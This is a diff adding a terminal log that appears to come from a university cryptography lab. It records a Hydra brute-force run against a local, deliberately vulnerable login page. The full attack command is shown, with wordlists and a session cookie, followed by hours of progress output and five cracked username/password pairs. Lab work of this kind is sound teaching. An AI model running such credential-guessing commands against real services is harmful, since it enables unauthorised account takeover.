@@ -1,0 +1,34 @@
+ihan@vivobookGo14:~/udp/labs/cripto-lab2$ hydra -L 'xato-net-10-million-usernames-5000.txt' -P 'xato-net-10-million-passwords-250.txt' 127.0.0.1 -s 4280 -t 64 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=c064546f2b39f57fe0ef98621fedfce2; security=low:incorrect"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-23 01:46:36
+[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 1250000 login tries (l:5000/p:250), ~19532 tries per task
+[DATA] attacking http-get-form://127.0.0.1:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=c064546f2b39f57fe0ef98621fedfce2; security=low:incorrect
+[4280][http-get-form] host: 127.0.0.1   login: admin   password: password
+[STATUS] 4803.00 tries/min, 4803 tries in 00:01h, 1245197 to do in 04:20h, 64 active
+[STATUS] 4737.33 tries/min, 14212 tries in 00:03h, 1235788 to do in 04:21h, 64 active
+[STATUS] 4863.14 tries/min, 34042 tries in 00:07h, 1215958 to do in 04:11h, 64 active
+[4280][http-get-form] host: 127.0.0.1   login: gordonb   password: abc123
+[STATUS] 5025.33 tries/min, 75380 tries in 00:15h, 1174620 to do in 03:54h, 64 active
+[STATUS] 5151.55 tries/min, 159698 tries in 00:31h, 1090302 to do in 03:32h, 64 active
+[4280][http-get-form] host: 127.0.0.1   login: pablo   password: letmein
+[STATUS] 5209.38 tries/min, 244841 tries in 00:47h, 1005159 to do in 03:13h, 64 active
+[STATUS] 5208.75 tries/min, 328151 tries in 01:03h, 921849 to do in 02:57h, 64 active
+[STATUS] 5218.53 tries/min, 412264 tries in 01:19h, 837736 to do in 02:41h, 64 active
+[STATUS] 5221.98 tries/min, 496088 tries in 01:35h, 753912 to do in 02:25h, 64 active
+[4280][http-get-form] host: 127.0.0.1   login: Admin   password: password
+[STATUS] 5225.59 tries/min, 580040 tries in 01:51h, 669960 to do in 02:09h, 64 active
+[STATUS] 5231.46 tries/min, 664395 tries in 02:07h, 585605 to do in 01:52h, 64 active
+[STATUS] 5232.36 tries/min, 748228 tries in 02:23h, 501772 to do in 01:36h, 64 active
+[STATUS] 5234.23 tries/min, 832242 tries in 02:39h, 417758 to do in 01:20h, 64 active
+[STATUS] 5238.15 tries/min, 916677 tries in 02:55h, 333323 to do in 01:04h, 64 active
+[4280][http-get-form] host: 127.0.0.1   login: smithy   password: password
+[STATUS] 5238.79 tries/min, 1000609 tries in 03:11h, 249391 to do in 00:48h, 64 active
+[STATUS] 5241.07 tries/min, 1084901 tries in 03:27h, 165099 to do in 00:32h, 64 active
+[STATUS] 5241.57 tries/min, 1168870 tries in 03:43h, 81130 to do in 00:16h, 64 active
+[STATUS] 5241.44 tries/min, 1195049 tries in 03:48h, 54951 to do in 00:11h, 64 active
+[STATUS] 5241.54 tries/min, 1221278 tries in 03:53h, 28722 to do in 00:06h, 64 active
+[STATUS] 5242.32 tries/min, 1247673 tries in 03:58h, 2327 to do in 00:01h, 64 active
+1 of 1 target successfully completed, 5 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-23 05:45:02
